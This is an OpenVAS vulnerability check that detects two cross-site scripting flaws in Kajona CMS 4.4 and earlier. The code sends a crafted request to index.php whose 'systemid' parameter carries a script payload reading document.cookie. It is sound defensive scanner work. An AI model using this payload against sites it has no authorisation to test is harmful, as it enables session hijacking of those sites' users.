###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kajona_cms_mult_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Kajona CMS Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Shakeel <bshakeel@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804824");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-4742", "CVE-2014-4743");
  script_bugtraq_id(68496, 68498);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-08-27 12:09:04 +0530 (Wed, 27 Aug 2014)");
  script_name("Kajona CMS Multiple Cross-Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Kajona CMS and is prone to multiple
  cross-site scripting vulnerabilities.");
  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is able to read cookie
  or not.");
  script_tag(name:"insight", value:"Multiple flaws exist as,

  - the search_ajax.tpl and search_ajax_small.tpl scripts in the Search module
  does not validate input passed via the 'search' parameter.

  - the system/class_link.php script does not validate input passed via the
  'systemid' parameter.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute arbitrary script
  code in a user's browser session within the trust relationship between their
  browser and the server.");
  script_tag(name:"affected", value:"Kajona CMS version 4.4 and prior.");
  script_tag(name:"solution", value:"Upgrade to Kajona CMS version 4.5 or later.");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94938");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94434");
  script_xref(name:"URL", value:"https://www.netsparker.com/critical-xss-vulnerability-in-kajonacms");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.kajona.de");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

http_port = get_http_port(default:80);

if(!can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/kajona", "/cmf", "/framework", cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if (rcvRes && "Kajona<" >< rcvRes)
  {
    url = dir + '/index.php?page=downloads&systemid="</script><script>aler' +
                't(document.cookie)</script>&action=';

    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"><script>alert\(document\.cookie\)</script>",
       extra_check:">Kajona<"))
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
